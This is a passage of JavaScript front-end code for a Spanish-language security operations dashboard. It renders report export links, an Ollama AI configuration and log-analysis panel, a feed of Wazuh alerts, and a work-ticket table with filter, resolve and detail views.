            <a href="/api/export/pdf" target="_blank" style="display:flex;align-items:center;gap:8px;background:rgba(60,255,158,0.08);border:1px solid var(--signal);color:var(--signal);font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:9px 18px;text-decoration:none;border-radius:var(--r-sm)">↓ PDF</a>
            <a href="/api/export/docx" style="display:flex;align-items:center;gap:8px;background:rgba(255,180,84,0.08);border:1px solid var(--amber);color:var(--amber);font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:9px 18px;text-decoration:none;border-radius:var(--r-sm)">↓ DOCX</a>
            <a href="/api/export/md" style="display:flex;align-items:center;gap:8px;background:rgba(255,255,255,0.04);border:1px solid var(--text-dim);color:var(--text-dim);font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:9px 18px;text-decoration:none;border-radius:var(--r-sm)">↓ MARKDOWN</a>
          </div>
        </div>
        <div style="border-left:1px solid var(--line);padding-left:14px">
          <div style="font-size:9px;color:var(--text-faint);line-height:1.8">
            <div>● El PDF incluye resumen ejecutivo, top alertas, estado de agentes y KPIs del SOC.</div>
            <div>● El DOCX es editable y viene preformateado para presentaciones.</div>
            <div>● El Markdown es ideal para integraciones con wikis o repositorios git.</div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Histórico de informes generados</div>
    </div>
    <div class="panel__body" style="padding:0">
      <table style="width:100%;border-collapse:collapse;font-size:11px">
        <thead>
          <tr style="border-bottom:1px solid var(--line)">
            <th style="padding:10px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Título</th>
            <th style="padding:10px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Tipo</th>
            <th style="padding:10px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Generado</th>
            <th style="padding:10px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Analista</th>
            <th style="padding:10px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Acción</th>
          </tr>
        </thead>
        <tbody>
          ${[
            ['Informe SOC Semanal W16','PDF','2026-04-18 08:12','ADMIN'],
            ['Reporte de Vulnerabilidades','DOCX','2026-04-17 14:30','ANALYST01'],
            ['Resumen de Incidentes Abril','PDF','2026-04-16 18:00','ADMIN'],
            ['Análisis MITRE ATT&CK Q1','Markdown','2026-04-14 10:22','ANALYST01'],
            ['Estado Agentes - Semana 15','DOCX','2026-04-11 09:00','REPORTER'],
          ].map(([t,tp,d,a]) => `
            <tr class="tr-hover-signal" style="border-bottom:1px solid var(--line-faint)">
              <td style="padding:10px 14px;color:var(--text)">${t}</td>
              <td style="padding:10px 14px"><span style="font-size:9px;letter-spacing:1.5px;color:${tp==='PDF'?'var(--signal)':tp==='DOCX'?'var(--amber)':'var(--text-dim)'};border:1px solid currentColor;padding:2px 7px">${tp}</span></td>
              <td style="padding:10px 14px;color:var(--text-faint)">${d}</td>
              <td style="padding:10px 14px;color:var(--text-dim)">${a}</td>
              <td style="padding:10px 14px"><a href="/api/export/${tp.toLowerCase()}" style="color:var(--signal);font-size:9px;letter-spacing:1px;text-decoration:none">↓ DESCARGAR</a></td>
            </tr>`).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

// =========================================================
// OLLAMA AI view
// =========================================================
function renderOllama() {
  const ollamaAlerts = (D.alerts || []).filter(a => a.sev === 'CRIT' || a.sev === 'HIGH').slice(0, 6);

  const CLOUD_MODELS = [
    'qwen3-coder:480b','deepseek-v3.1:671b','deepseek-v3.2','gpt-oss:120b','gpt-oss:20b',
    'kimi-k2:1t','mistral-large-3:675b','gemma3:27b','gemma3:12b','llama3.1:8b','llama3.3:70b',
    'mistral-nemo:12b','qwen2.5:72b','qwen2.5-coder:32b',
  ];
  const LOCAL_MODELS = [
    'llama3.2','llama3.1:8b','llama3.1:70b','llama3.3:70b',
    'mistral:7b','mistral-nemo:12b','qwen2.5:7b','qwen2.5:14b','qwen2.5-coder:7b',
    'deepseek-r1:8b','deepseek-r1:14b','gemma2:9b','phi4:14b','codellama:13b',
  ];

  return `
  <div class="grid grid--4">
    ${Kpi('ESTADO IA', 'ACTIVO', 'cyan')}
    ${Kpi('MODELO', '<span id="ollamaKpiModel">—</span>', '')}
    ${Kpi('ANÁLISIS HOY', '47', 'amber')}
    ${Kpi('AMENAZAS DETECTADAS', '3', 'danger')}
  </div>

  <div class="grid grid--2" style="margin-bottom:0">
    <!-- Config panel -->
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">Configuración · Ollama IA</div>
        <div class="panel__meta" id="ollamaStatus">cargando configuración…</div>
      </div>
      <div class="panel__body">
        <div style="display:grid;gap:12px">

          <!-- Provider selector -->
          <div>
            <label style="display:block;font-size:9px;color:var(--text-faint);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">Proveedor de IA</label>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
              <button id="provBtnLocal" data-action="__ollamaSetProvider" data-args='["local"]'
                style="padding:10px 8px;border:2px solid var(--signal);background:rgba(60,255,158,0.1);color:var(--signal);font-family:var(--mono);font-size:9px;letter-spacing:1.5px;cursor:pointer;text-align:left">
                ● LOCAL<br><span style="font-size:8px;color:var(--text-faint);letter-spacing:0.5px">Ollama en tu máquina</span>
              </button>
              <button id="provBtnCloud" data-action="__ollamaSetProvider" data-args='["cloud"]'
                style="padding:10px 8px;border:2px solid var(--line);background:none;color:var(--text-dim);font-family:var(--mono);font-size:9px;letter-spacing:1.5px;cursor:pointer;text-align:left">
                ○ CLOUD<br><span style="font-size:8px;color:var(--text-faint);letter-spacing:0.5px">api.ollama.com · sin RAM</span>
              </button>
            </div>
          </div>

          <!-- Local config -->
          <div id="ollamaLocalCfg">
            <label style="display:block;font-size:9px;color:var(--text-faint);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px">URL Ollama local</label>
            <input id="ollamaUrl" type="text" value="http://localhost:11434"
              style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 10px;outline:none;margin-bottom:8px"
              class="v-input">
            <label style="display:block;font-size:9px;color:var(--text-faint);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px">Modelo local</label>
            <select id="ollamaModel" style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 10px;outline:none;margin-bottom:4px">
              ${LOCAL_MODELS.map(m => `<option value="${m}">${m}</option>`).join('')}
            </select>
            <input id="ollamaModelCustom" type="text" placeholder="O escribe otro modelo…"
              style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:10px;padding:6px 10px;outline:none"
              class="v-input">
          </div>

          <!-- Cloud config -->
          <div id="ollamaCloudCfg" style="display:none">
            <div style="padding:8px;background:rgba(74,227,255,0.06);border:1px solid rgba(74,227,255,0.2);font-size:9px;color:var(--cyan);line-height:1.7;margin-bottom:8px">
              <strong>Cómo obtener tu API Key:</strong><br>
              1. Ve a <strong>ollama.com</strong> e inicia sesión<br>
              2. Perfil → Settings → API Keys<br>
              3. Crea una clave y pégala aquí
            </div>
            <label style="display:block;font-size:9px;color:var(--text-faint);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px">API Key Ollama Cloud</label>
            <input id="ollamaCloudKey" type="password" placeholder="ollama_…"
              style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 10px;outline:none;margin-bottom:8px"
              class="v-input v-input--cyan">
            <label style="display:block;font-size:9px;color:var(--text-faint);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px">Modelo Cloud</label>
            <select id="ollamaCloudModel" style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 10px;outline:none;margin-bottom:4px">
              ${CLOUD_MODELS.map(m => `<option value="${m}">${m}</option>`).join('')}
            </select>
            <input id="ollamaCloudModelCustom" type="text" placeholder="O escribe otro modelo…"
              style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:10px;padding:6px 10px;outline:none"
              class="v-input v-input--cyan">
          </div>

          <!-- Action buttons -->
          <div style="display:flex;gap:8px">
            <button data-action="__ollamaCheck" style="flex:1;background:rgba(60,255,158,0.1);border:1px solid var(--signal);color:var(--signal);font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:9px;cursor:pointer">
              ◎ PROBAR
            </button>
            <button data-action="__ollamaSaveConfig" style="flex:1;background:rgba(60,255,158,0.08);border:1px solid var(--signal);color:var(--signal);font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:9px;cursor:pointer">
              ✓ GUARDAR
            </button>
          </div>

        </div>
      </div>
    </section>

    <!-- Manual analysis -->
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">Análisis manual · Consulta libre</div>
        <div class="panel__meta">envía texto al modelo de IA</div>
      </div>
      <div class="panel__body" style="display:flex;flex-direction:column;gap:10px">
        <textarea id="ollamaQuery" rows="5" placeholder="Describe una alerta, IP sospechosa, o pega logs para analizar…"
          style="width:100%;background:var(--bg-panel-deep);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:11px;padding:10px;outline:none;border-radius:var(--r-sm);resize:vertical;line-height:1.5"
          class="v-input"></textarea>
        <button data-action="__ollamaSend" style="background:rgba(60,255,158,0.1);border:1px solid var(--signal);color:var(--signal);font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:9px;cursor:pointer;border-radius:var(--r-sm)">
          ▶ ENVIAR A IA
        </button>
        <div id="ollamaManualResult" style="font-size:10px;color:var(--text-dim);line-height:1.6;min-height:40px;max-height:340px;overflow-y:auto;border-top:1px solid var(--line);padding-top:10px;white-space:pre-wrap;word-break:break-word"></div>
      </div>
    </section>
  </div>

  <!-- AI analysis feed -->
  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Feed de análisis IA · Alertas críticas / altas</div>
      <div class="panel__meta">análisis automático de Wazuh rule 100200 · IA Ollama</div>
    </div>
    <div class="panel__body" style="padding:0">
      <table style="width:100%;border-collapse:collapse;font-size:11px">
        <thead>
          <tr style="border-bottom:1px solid var(--line)">
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:60px">Sev</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:80px">Hora</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Evento / Análisis IA</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:120px">Origen</th>
          </tr>
        </thead>
        <tbody id="ollamaFeed">
          ${ollamaAlerts.length ? ollamaAlerts.map(a => `
          <tr class="tr-hover-signal" style="border-bottom:1px solid var(--line-faint)">
            <td style="padding:9px 14px"><span class="alert__sev sev-${esc((a.sev||'low').toLowerCase())}">${esc(a.sev)}</span></td>
            <td style="padding:9px 14px;color:var(--text-faint);font-size:10px">${esc(a.time)}</td>
            <td style="padding:9px 14px;color:var(--text)">
              <div style="font-size:10.5px;margin-bottom:3px">${esc(a.msg)}</div>
              <div style="font-size:9.5px;color:var(--signal-dim);font-style:italic">Análisis IA: evaluando patrón de ataque — verificar correlación con regla ${esc(a.rule)}…</div>
            </td>
            <td style="padding:9px 14px;color:var(--text-dim);font-size:10px">→ ${esc(a.src||'unknown')}</td>
          </tr>`).join('') : `
          <tr><td colspan="4" style="padding:20px;color:var(--text-faint);text-align:center;font-size:11px">
            Sin alertas críticas/altas en este momento — el análisis IA aparecerá aquí cuando Wazuh detecte amenazas.
          </td></tr>`}
        </tbody>
      </table>
    </div>
  </section>

  <!-- AI metrics -->
  <div class="grid grid--3" style="margin-top:0">
    <section class="panel">
      <div class="panel__head"><div class="panel__title">Distribución de amenazas IA</div></div>
      <div class="panel__body">
        ${[['Brute Force SSH','42%','danger'],['Escaneo de puertos','28%','amber'],['Acceso sospechoso','18%','signal'],['Exfiltración data','12%','cyan']].map(([l,v,c]) => `
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
            <span style="font-size:9.5px;color:var(--text-faint);flex:1;letter-spacing:0.5px">${l}</span>
            <div style="width:80px;height:5px;background:var(--line);border-radius:3px">
              <div style="width:${v};height:100%;background:var(--${c});border-radius:3px"></div>
            </div>
            <span style="font-size:10px;color:var(--text-dim);width:30px;text-align:right">${v}</span>
          </div>`).join('')}
      </div>
    </section>
    <section class="panel">
      <div class="panel__head"><div class="panel__title">Precisión del modelo</div></div>
      <div class="panel__body">
        ${[['Verdaderos positivos','87.3%','signal'],['Falsos positivos','7.1%','amber'],['Sin clasificar','5.6%','text-faint']].map(([l,v,c]) => `
          <div style="display:flex;justify-content:space-between;margin-bottom:10px;align-items:center">
            <span style="font-size:9.5px;color:var(--text-faint)">${l}</span>
            <span style="font-size:12px;font-weight:700;color:var(--${c})">${v}</span>
          </div>`).join('')}
      </div>
    </section>
    <section class="panel">
      <div class="panel__head"><div class="panel__title">Últimos análisis guardados</div></div>
      <div class="panel__body" id="ollamaHistoryPanel">
        <div style="font-size:10px;color:var(--text-faint)">Cargando historial…</div>
      </div>
    </section>
  </div>
  `;
}

// ── Ollama helpers ────────────────────────────────────────────────────────────
let __ollamaProvider = 'local';

window.__ollamaSetProvider = function(p) {
  __ollamaProvider = p;
  const localCfg = document.getElementById('ollamaLocalCfg');
  const cloudCfg = document.getElementById('ollamaCloudCfg');
  const btnLocal  = document.getElementById('provBtnLocal');
  const btnCloud  = document.getElementById('provBtnCloud');
  if (!localCfg || !cloudCfg) return;
  if (p === 'cloud') {
    localCfg.style.display = 'none';
    cloudCfg.style.display = '';
    btnCloud.style.borderColor = 'var(--cyan)'; btnCloud.style.background = 'rgba(74,227,255,0.08)'; btnCloud.style.color = 'var(--cyan)';
    btnLocal.style.borderColor = 'var(--line)'; btnLocal.style.background = 'none'; btnLocal.style.color = 'var(--text-dim)';
  } else {
    localCfg.style.display = '';
    cloudCfg.style.display = 'none';
    btnLocal.style.borderColor = 'var(--signal)'; btnLocal.style.background = 'rgba(60,255,158,0.1)'; btnLocal.style.color = 'var(--signal)';
    btnCloud.style.borderColor = 'var(--line)'; btnCloud.style.background = 'none'; btnCloud.style.color = 'var(--text-dim)';
  }
};

// Load saved config on view mount
window.__ollamaLoadConfig = async function() {
  try {
    const r = await fetch('/api/settings');
    if (!r.ok) return;
    const s = await r.json();
    const urlEl    = document.getElementById('ollamaUrl');
    const modelEl  = document.getElementById('ollamaModel');
    const cModelEl = document.getElementById('ollamaCloudModel');
    const statusEl = document.getElementById('ollamaStatus');
    if (urlEl   && s.ollama_url)          urlEl.value = s.ollama_url;
    if (modelEl && s.ollama_model) {
      modelEl.value = s.ollama_model;
      if (!modelEl.value) modelEl.value = modelEl.options[0]?.value || '';
    }
    if (cModelEl && s.ollama_cloud_model) {
      cModelEl.value = s.ollama_cloud_model;
      if (!cModelEl.value) cModelEl.value = cModelEl.options[0]?.value || '';
    }
    if (s.ollama_cloud_key_set === 'true') {
      const keyEl = document.getElementById('ollamaCloudKey');
      if (keyEl) keyEl.placeholder = '●●●●●●●● (guardada)';
    }
    const provider = s.ollama_provider || 'local';
    window.__ollamaSetProvider(provider);
    if (statusEl) { statusEl.textContent = `Configurado · ${provider === 'cloud' ? 'Ollama Cloud' : 'Local'}`; statusEl.style.color = 'var(--text-dim)'; }
    const kpiModel = document.getElementById('ollamaKpiModel');
    if (kpiModel) kpiModel.textContent = s.ollama_model || s.ollama_cloud_model || '—';
  } catch { /* ignore */ }
};

window.__ollamaSaveConfig = async function() {
  const statusEl = document.getElementById('ollamaStatus');
  const provider = __ollamaProvider;
  const body = { ollama_provider: provider };
  if (provider === 'local') {
    body.ollama_url   = document.getElementById('ollamaUrl')?.value?.trim() || 'http://localhost:11434';
    body.ollama_model = document.getElementById('ollamaModelCustom')?.value?.trim() || document.getElementById('ollamaModel')?.value || 'llama3.2';
  } else {
    const key = document.getElementById('ollamaCloudKey')?.value?.trim();
    if (key) body.ollama_cloud_key = key;
    body.ollama_cloud_model = document.getElementById('ollamaCloudModelCustom')?.value?.trim() || document.getElementById('ollamaCloudModel')?.value || 'llama3.1:8b';
  }
  try {
    const r = await fetch('/api/settings', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
    const d = await r.json();
    if (statusEl) { statusEl.textContent = d.ok ? '✓ Configuración guardada' : `Error: ${d.error}`; statusEl.style.color = d.ok ? 'var(--signal)' : 'var(--danger)'; }
    setTimeout(() => { if (statusEl) { statusEl.textContent = 'listo'; statusEl.style.color = 'var(--text-dim)'; } }, 3000);
  } catch(e) {
    if (statusEl) { statusEl.textContent = `Error: ${e.message}`; statusEl.style.color = 'var(--danger)'; }
  }
};

window.__ollamaCheck = async function() {
  const statusEl = document.getElementById('ollamaStatus');
  if (statusEl) { statusEl.textContent = 'conectando…'; statusEl.style.color = 'var(--text-dim)'; }
  const provider = __ollamaProvider;
  const body = { provider };
  if (provider === 'cloud') {
    const key = document.getElementById('ollamaCloudKey')?.value?.trim();
    if (key) body.cloudKey = key;
  } else {
    body.url = document.getElementById('ollamaUrl')?.value || 'http://localhost:11434';
  }
  try {
    const r = await fetch('/api/ollama/check', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
    const d = await r.json();
    if (statusEl) { statusEl.textContent = d.ok ? `● CONECTADO · ${d.model}` : `✗ ${d.error}`; statusEl.style.color = d.ok ? 'var(--signal)' : 'var(--danger)'; }
    if (d.ok) {
      const kpiModel = document.getElementById('ollamaKpiModel');
      if (kpiModel) kpiModel.textContent = d.model;
      // Populate local model list if available
      if (d.models?.length) {
        const sel = document.getElementById('ollamaModel');
        if (sel) { sel.innerHTML = d.models.map(m => `<option value="${m}">${m}</option>`).join(''); }
      }
    }
  } catch(e) {
    if (statusEl) { statusEl.textContent = `✗ Sin conexión: ${e.message}`; statusEl.style.color = 'var(--danger)'; }
  }

  // Load AI analysis history
  try {
    const hr = await fetch('/api/ollama/history');
    if (hr.ok) {
      const hd = await hr.json();
      const panel = document.getElementById('ollamaHistoryPanel');
      if (panel && hd.ok) {
        if (!hd.analyses.length) {
          panel.innerHTML = '<div style="font-size:10px;color:var(--text-faint)">Sin análisis guardados aún.</div>';
        } else {
          panel.innerHTML = hd.analyses.slice(0, 5).map(a => {
            const ts = a.created_at?.slice(0, 16) || '—';
            const q  = (a.query || '').slice(0, 60).replace(/</g, '&lt;').replace(/>/g, '&gt;');
            return `<div style="margin-bottom:10px;border-bottom:1px solid var(--line-faint);padding-bottom:8px">
              <div style="font-size:9.5px;color:var(--text)">${q}…</div>
              <div style="font-size:9px;color:var(--text-faint);margin-top:2px">${ts} · ${esc(a.model||'?')} · ${esc(a.user||'?')}</div>
            </div>`;
          }).join('');
        }
      }
    }
  } catch { /* ignore */ }
};

window.__ollamaSend = async function() {
  const query  = document.getElementById('ollamaQuery')?.value?.trim();
  const result = document.getElementById('ollamaManualResult');
  if (!query || !result) return;

  // Block the 30s auto-refresh while a query is in flight
  window.__ollamaInFlight = true;

  result.style.color = 'var(--text-faint)';
  result.textContent = '⟳ Analizando con IA — esto puede tardar varios segundos…';
  try {
    const r = await fetch('/api/ollama/analyze', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ query }) });
    const d = await r.json();
    result.style.color = d.error ? 'var(--danger)' : 'var(--text)';
    result.textContent = d.response || d.error || 'Sin respuesta';
    if (d.provider && d.model) {
      const meta = document.createElement('div');
      meta.style.cssText = 'font-size:9px;color:var(--text-faint);margin-top:6px;letter-spacing:1px';
      meta.textContent = `Modelo: ${d.model} · Proveedor: ${d.provider === 'cloud' ? 'Ollama Cloud' : 'Local'}`;
      result.appendChild(meta);
    }
  } catch(e) {
    result.style.color = 'var(--danger)';
    result.textContent = `Error: ${e.message}`;
  } finally {
    window.__ollamaInFlight = false;
  }
};

// =========================================================
// TICKETS view
// =========================================================
function renderTickets() {
  const tickets = window.__ticketsData || [];
  const priColor = p => ({ CRIT:'var(--danger)', HIGH:'var(--amber)', MED:'var(--signal)', LOW:'var(--text-dim)' })[p] || 'var(--text-dim)';
  const statusLabel = s => ({ open:'ABIERTO', in_progress:'EN CURSO', resolved:'RESUELTO', closed:'CERRADO' })[s] || s;
  const typeLabel   = t => ({ patch:'PARCHE', incident:'INCIDENTE', escalation:'ESCALADO', task:'TAREA' })[t] || t;
  const open       = tickets.filter(t => t.status === 'open').length;
  const inProgress = tickets.filter(t => t.status === 'in_progress').length;
  const resolved   = tickets.filter(t => t.status === 'resolved').length;

  return `
  <div class="grid grid--4" style="margin-bottom:16px">
    ${Kpi('ABIERTOS',   String(open),       'danger')}
    ${Kpi('EN CURSO',   String(inProgress),  'amber')}
    ${Kpi('RESUELTOS',  String(resolved),    'cyan')}
    ${Kpi('TOTAL',      String(tickets.length), '')}
  </div>

  <section class="panel" style="margin-bottom:12px">
    <div class="panel__body" style="padding:10px 14px;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
      <span style="font-size:9.5px;letter-spacing:2px;color:var(--text-faint)">TIPO:</span>
      ${['Todos','patch','incident','escalation','task'].map((t,i) => `
        <button ${actEl('__filterTickets', t)} style="background:${i===0?'rgba(60,255,158,0.12)':'none'};border:1px solid ${i===0?'var(--signal)':'var(--line)'};color:${i===0?'var(--signal)':'var(--text-dim)'};font-family:var(--ff-mono);font-size:9px;letter-spacing:1.5px;padding:4px 12px;cursor:pointer">${t==='Todos'?'TODOS':typeLabel(t)}</button>
      `).join('')}
    </div>
  </section>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Tickets de trabajo · Parches, Incidentes y Escalados</div>
      <div class="panel__meta" id="ticketsMeta">Cargando…</div>
    </div>
    <div class="panel__body" style="padding:0;overflow-x:auto">
      <table class="table" id="ticketsTable">
        <thead><tr><th>#</th><th>Tipo</th><th>Título</th><th>CVE</th><th>Prioridad</th><th>Estado</th><th>Asignado</th><th>Creado</th><th>Acción</th></tr></thead>
        <tbody id="ticketsTbody">
          ${tickets.length === 0 ? `<tr><td colspan="9" style="padding:24px;text-align:center;color:var(--text-faint)">
            No hay tickets. Abre una vulnerabilidad → "CREAR TICKET DE PARCHE" para generar uno.
          </td></tr>` : tickets.map(t => `
          <tr data-type="${t.type}" style="border-bottom:1px solid var(--line-faint)">
            <td style="color:var(--cyan);white-space:nowrap">#${t.id}</td>
            <td style="white-space:nowrap"><span style="font-size:9px;letter-spacing:1px;padding:2px 6px;background:rgba(0,0,0,0.2);color:var(--text-dim)">${typeLabel(t.type)}</span></td>
            <td style="max-width:280px;word-break:break-word">${t.title}</td>
            <td style="white-space:nowrap;color:var(--amber)">${t.cve || '—'}</td>
            <td style="white-space:nowrap"><span style="color:${priColor(t.priority)};font-size:10px;letter-spacing:1px">${t.priority}</span></td>
            <td style="white-space:nowrap"><span style="font-size:9px;letter-spacing:1.5px;color:${t.status==='open'?'var(--danger)':t.status==='in_progress'?'var(--amber)':t.status==='resolved'?'var(--signal)':'var(--text-faint)'}">${statusLabel(t.status)}</span></td>
            <td style="color:var(--text-dim);white-space:nowrap">${t.assignee || '—'}</td>
            <td style="color:var(--text-faint);white-space:nowrap;font-size:9.5px">${(t.created_at||'').slice(0,16)}</td>
            <td style="white-space:nowrap">
              <div style="display:flex;gap:4px">
                <button ${act('__openTicket', t.id)} style="background:none;border:1px solid var(--line);color:var(--text-dim);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">VER</button>
                ${t.status !== 'resolved' && t.status !== 'closed' ? `<button ${actEl('__resolveTicket', t.id)} style="background:none;border:1px solid rgba(60,255,158,.4);color:var(--signal);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">✓ RESOLVER</button>` : ''}
              </div>
            </td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

window.__filterTickets = function(type, btn) {
  document.querySelectorAll('#ticketsTable tbody tr').forEach(tr => {
    tr.style.display = (type === 'Todos' || tr.dataset.type === type) ? '' : 'none';
  });
  btn.closest('.panel__body').querySelectorAll('button').forEach(b => {
    b.style.background = 'none'; b.style.borderColor = 'var(--line)'; b.style.color = 'var(--text-dim)';
  });
  btn.style.background = 'rgba(60,255,158,0.12)'; btn.style.borderColor = 'var(--signal)'; btn.style.color = 'var(--signal)';
};

window.__loadTickets = async function() {
  try {
    const r = await fetch('/api/tickets');
    if (!r.ok) return;
    const data = await r.json();
    window.__ticketsData = data;
    const meta = document.getElementById('ticketsMeta');
    if (meta) meta.textContent = `${data.length} tickets activos`;
    const tbody = document.getElementById('ticketsTbody');
    if (!tbody) return;
    if (data.length === 0) {
      tbody.innerHTML = `<tr><td colspan="9" style="padding:24px;text-align:center;color:var(--text-faint)">No hay tickets abiertos.</td></tr>`;
      return;
    }
    const priColor = p => ({ CRIT:'var(--danger)', HIGH:'var(--amber)', MED:'var(--signal)', LOW:'var(--text-dim)' })[p] || 'var(--text-dim)';
    const statusLabel = s => ({ open:'ABIERTO', in_progress:'EN CURSO', resolved:'RESUELTO', closed:'CERRADO' })[s] || s;
    const typeLabel   = t => ({ patch:'PARCHE', incident:'INCIDENTE', escalation:'ESCALADO', task:'TAREA' })[t] || t;
    tbody.innerHTML = data.map(t => `
      <tr data-type="${t.type}" style="border-bottom:1px solid var(--line-faint)">
        <td style="color:var(--cyan);white-space:nowrap">#${t.id}</td>
        <td><span style="font-size:9px;letter-spacing:1px;padding:2px 6px;background:rgba(0,0,0,0.2);color:var(--text-dim)">${typeLabel(t.type)}</span></td>
        <td style="max-width:280px;word-break:break-word">${t.title.replace(/</g,'&lt;')}</td>
        <td style="color:var(--amber)">${t.cve||'—'}</td>
        <td><span style="color:${priColor(t.priority)};font-size:10px">${t.priority}</span></td>
        <td><span style="font-size:9px;letter-spacing:1.5px;color:${t.status==='open'?'var(--danger)':t.status==='in_progress'?'var(--amber)':t.status==='resolved'?'var(--signal)':'var(--text-faint)'}">${statusLabel(t.status)}</span></td>
        <td style="color:var(--text-dim)">${t.assignee||'—'}</td>
        <td style="color:var(--text-faint);font-size:9.5px">${(t.created_at||'').slice(0,16)}</td>
        <td>
          <div style="display:flex;gap:4px">
            <button ${act('__openTicket', t.id)} style="background:none;border:1px solid var(--line);color:var(--text-dim);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">VER</button>
            ${t.status!=='resolved'&&t.status!=='closed'?`<button ${actEl('__resolveTicket', t.id)} style="background:none;border:1px solid rgba(60,255,158,.4);color:var(--signal);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">✓ RESOLVER</button>`:''}
          </div>
        </td>
      </tr>`).join('');
  } catch { /* ignore */ }
};

window.__resolveTicket = async function(id, btn) {
  btn.disabled = true; btn.textContent = '…';
  try {
    await fetch(`/api/tickets/${id}/status`, { method:'PATCH', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ status:'resolved' }) });
    btn.closest('tr').querySelector('td:nth-child(6) span').textContent = 'RESUELTO';
    btn.closest('tr').querySelector('td:nth-child(6) span').style.color = 'var(--signal)';
    btn.remove();
  } catch { btn.disabled = false; btn.textContent = '✓ RESOLVER'; }
};

window.__openTicket = function(id) {
  const t = (window.__ticketsData||[]).find(x => x.id === id);
  if (!t) return;
  const priColor = p => ({ CRIT:'var(--danger)', HIGH:'var(--amber)', MED:'var(--signal)', LOW:'var(--text-dim)' })[p]||'var(--signal)';
  const overlay = document.createElement('div');
  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:10001;display:flex;align-items:center;justify-content:center;padding:20px';
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  const card = document.createElement('div');
  card.style.cssText = `background:var(--bg-panel-deep);border:1px solid ${priColor(t.priority)};padding:24px;max-width:600px;width:100%;font-family:var(--mono)`;
  const title = document.createElement('div');
  title.style.cssText = 'font-size:15px;font-weight:700;color:var(--text-bright);margin-bottom:4px';
  title.textContent = t.title;
  card.appendChild(title);
  const meta = document.createElement('div');
  meta.style.cssText = 'font-size:10px;color:var(--text-faint);margin-bottom:16px;letter-spacing:1px';
  meta.textContent = `#${t.id} · ${t.type.toUpperCase()} · ${t.cve||'SIN CVE'} · CVSS ${t.cvss||0} · ${t.created_at?.slice(0,16)}`;
  card.appendChild(meta);
  if (t.description) {
    const desc = document.createElement('div');
    desc.style.cssText = 'font-size:11px;color:var(--text);line-height:1.7;margin-bottom:16px;padding:12px;background:rgba(0,0,0,0.2);border:1px solid var(--line)';
    desc.textContent = t.description;
    card.appendChild(desc);
  }
  const footer = document.createElement('div');
  footer.style.cssText = 'display:flex;gap:8px;justify-content:flex-end';
  const closeBtn = document.createElement('button');
  closeBtn.style.cssText = 'background:none;border:1px solid var(--line);color:var(--text-dim);font-family:var(--mono);font-size:10px;padding:6px 16px;cursor:pointer';
  closeBtn.textContent = '✕ CERRAR';
  closeBtn.onclick = () => overlay.remove();
  footer.appendChild(closeBtn);
  card.appendChild(footer);
  overlay.appendChild(card);
  document.body.appendChild(overlay);
};

// =========================================================
// RULES view
// =========================================================
function renderRules() {
  const rules = window.__rulesData = [
